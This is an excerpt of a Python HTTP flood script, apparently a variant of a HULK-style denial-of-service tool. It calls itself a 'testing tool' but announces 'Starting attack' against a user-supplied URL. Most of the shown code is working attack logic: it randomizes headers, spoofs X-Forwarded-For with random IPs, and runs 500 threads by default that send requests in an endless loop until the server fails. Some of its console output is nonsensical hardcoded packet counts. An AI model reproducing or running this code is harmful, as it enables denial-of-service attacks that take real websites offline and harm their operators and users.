...
# --- Global counter for console line updates ---
packet_line_counter = 0

# --- Helper Functions ---
def usage():
    print(logo)
    print(r"----------------------------------------------------------------------------------------------")
    print(r"The Silliest Testing Tool.. by goo")
    print(r"----------------------------------------------------------------------------------------------")
    print(r"Usage: python lol.py <URL> [safe]")
    print(r"Example: python lol.py [http://www.example.com](http://www.example.com) safe")
    print(r"        (add 'safe' to enable safe mode which stops if server returns 500)")
...
# --- Header List Population Functions ---
def useragent_list():
...
def referer_list():
    ...
    headers_referers.extend([
        f"[http://www.google.com/?q=](http://www.google.com/?q=){random.randint(1,100)}",
        f"[http://www.bing.com/?q=](http://www.bing.com/?q=){random.randint(1,100)}",
        f"[http://www.yahoo.com/?q=](http://www.yahoo.com/?q=){random.randint(1,100)}",
        f"[http://www.facebook.com/l.php?u=](http://www.facebook.com/l.php?u=){url}",
        f"[http://t.co/dvmfdkfdasf?q=](http://t.co/dvmfdkfdasf?q=){random.randint(1,100)}",
        f"http://{host}/?q={random.randint(1,100)}"
    ])

def accept_language_list():
    global headers_accept_language
    headers_accept_language.extend([
        "en-US,en;q=0.9",
        "es-ES,es;q=0.8",
        "fr-FR,fr;q=0.7",
        "de-DE,de;q=0.6",
    ...
    if not headers_accept_language: # Added this check for robustness
        print("[!] Warning: Accept-Language list is empty. Using a default.")
        headers_accept_language = ["en-US"] # Fallback

def load_spoofed_ips(filename='spoofed_ips.txt'):
    global spoofed_ips
    try:
        ...
        if not spoofed_ips:
            print(f"Warning: '{filename}' found but contains no valid IPv4 addresses.")
    except FileNotFoundError:
        print(f"Warning: '{filename}' not found. No custom spoofed IPs will be used.")
    except Exception as e:
        print(f"Error loading spoofed IPs from '{filename}': {e}")

    # If no IPs loaded from file, populate with random ones
    if not spoofed_ips:
        print("Generating random spoofed IPs for X-Forwarded-For header.")
        spoofed_ips.extend([
            f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(50)
        ])


# --- The core request sending function ---
# --- NEW GLOBAL COUNTER FOR PRINTING & LOCK FOR THREAD SAFETY ---
# (Place these at the top of your script, near other global variable declarations)
packet_line_counter = 0

# --- The core request sending function ---
def down_it():
    global flag
    global packet_line_counter # Re-introduce global access for this
    while True:
        try:
            if flag == 1:
                break
            ...
            accept_lang = random.choice(headers_accept_language)
            
            # Use a random spoofed IP from the loaded list
            # Fallback to random generation if for some reason spoofed_ips is still empty
            spoofed_ip = random.choice(spoofed_ips) if spoofed_ips else \
            ...
            headers = {
                ...
                'X-Forwarded-For': spoofed_ip, # Spoofing IP
            ...
            urllib.request.urlopen(request, timeout=5) # Added a timeout for robustness
            inc_counter() # Increment successful request counter
            
            # --- RE-ADDED ORIGINAL PRINTING ---
            # This will print for every single packet sent, as originally requested.
            # Be aware this can cause significant console flooding and performance overhead.
            packet_line_counter += 1 # Increment for every packet sent
            print("----> !! 2 packets sent !! <----")
            print("----> !! 1 packets sent !! <----")
            print("----> !! 3 packets sent !! <----")
            print("----> !! 2 packets sent !! <----")
            print("----> !! 2 packets sent !! <----")
            print("----> !! 4 packets sent !! <----")
            sys.stdout.flush()

        except urllib.error.HTTPError as e:
            inc_error_counter()
            if e.code == 500 and safe == 1:
                set_flag(1)
                print(f"\n[!] Server returned 500, exiting in safe mode.")
            # Optionally add more specific error handling here
            # print(f"[!] HTTP Error: {e.code} - {e.reason}")
        except urllib.error.URLError as e:
            inc_error_counter()
            # print(f"[!] URL Error (e.g., connectivity issue): {e.reason}")
        except Exception as e:
            inc_error_counter()
            # print(f"[!] An unexpected error occurred in down_it(): {e}")
...
def setup():
    global url
    global host
    global flag # Ensure flag is accessible for early exit
    global threads_to_start # New variable for configurable thread count
    ...
    if not match:
        print("[!] Invalid URL format. Please use [http://www.example.com](http://www.example.com)")
        sys.exit(1)
    host = match.group(1)

    threads_to_start = 500 # Default hardcoded value

    # Check for 'safe' mode and custom thread count
    if len(sys.argv) >= 3:
        for arg in sys.argv[2:]:
            if arg.lower() == 'safe':
                set_safe()
                print("[+] Safe mode enabled.")
            elif arg.isdigit(): # Check if it's a number for thread count
                try:
                    threads_to_start = int(arg)
                    if threads_to_start <= 0:
                        print("[!] Thread count must be a positive integer. Using default 500.")
                        threads_to_start = 500
                    else:
                        print(f"[+] Using {threads_to_start} threads.")
                except ValueError:
                    print(f"[!] Invalid argument '{arg}'. Ignoring.")
            else:
                print(f"[!] Unrecognized argument: '{arg}'. Ignoring.")

    print(logo)
    print(f"\n[+] Target: {url}")
    print(f"[+] Host: {host}")
    print("[+] Building attack parameters...")
    time.sleep(1)
    ...
    if not headers_useragents or not headers_referers or not headers_accept_language or not spoofed_ips:
        print("[!] Error: Necessary header lists or spoofed IPs are empty. Please check the script or 'spoofed_ips.txt'.")
        sys.exit(1)

    print(f"[+] Starting attack with {threads_to_start} threads...")

    active_threads = [] # Keep track of threads to join them later
    # Start threads with a small delay to prevent initial connection storms
    for i in range(threads_to_start):
        thread = MyThread()
        thread.start()
        active_threads.append(thread) # Add to list
        time.sleep(0.01)  # Small delay between starting each thread (10ms)

    # Keep the main thread alive to monitor the flag and gracefully exit
    try:
        while flag == 0:
            time.sleep(0.5)
    except KeyboardInterrupt:
        set_flag(1) # Set flag to stop threads on Ctrl+C
        print("\n[!] Attack interrupted by user (Ctrl+C). Waiting for threads to finish...")
        # Give a small moment for threads to acknowledge the flag and break their loops
        # It's better to explicitly join them for a cleaner exit.
        for t in active_threads:
            if t.is_alive(): # Only try to join if the thread is still running
                t.join(timeout=5) # Wait for thread to finish, with a timeout
